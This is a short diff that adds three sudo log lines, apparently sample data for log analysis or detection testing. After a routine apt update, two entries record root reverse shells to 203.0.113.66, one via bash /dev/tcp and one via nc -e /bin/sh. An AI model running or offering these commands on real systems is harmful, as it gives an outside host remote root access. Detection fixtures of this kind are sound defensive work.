@@ -1,0 +1,3 @@
+2026-01-07T12:00:01+00:00 app01 sudo[4101]: opsuser : TTY=pts/0 ; PWD=/home/opsuser ; USER=root ; COMMAND=/usr/bin/apt update
+2026-01-07T12:02:10+00:00 app01 sudo[4120]: opsuser : TTY=pts/0 ; PWD=/home/opsuser ; USER=root ; COMMAND=/bin/bash -c 'bash -i >& /dev/tcp/203.0.113.66/4444 0>&1'
+2026-01-07T12:03:30+00:00 app01 sudo[4135]: opsuser : TTY=pts/0 ; PWD=/home/opsuser ; USER=root ; COMMAND=/usr/bin/nc -e /bin/sh 203.0.113.66 4445
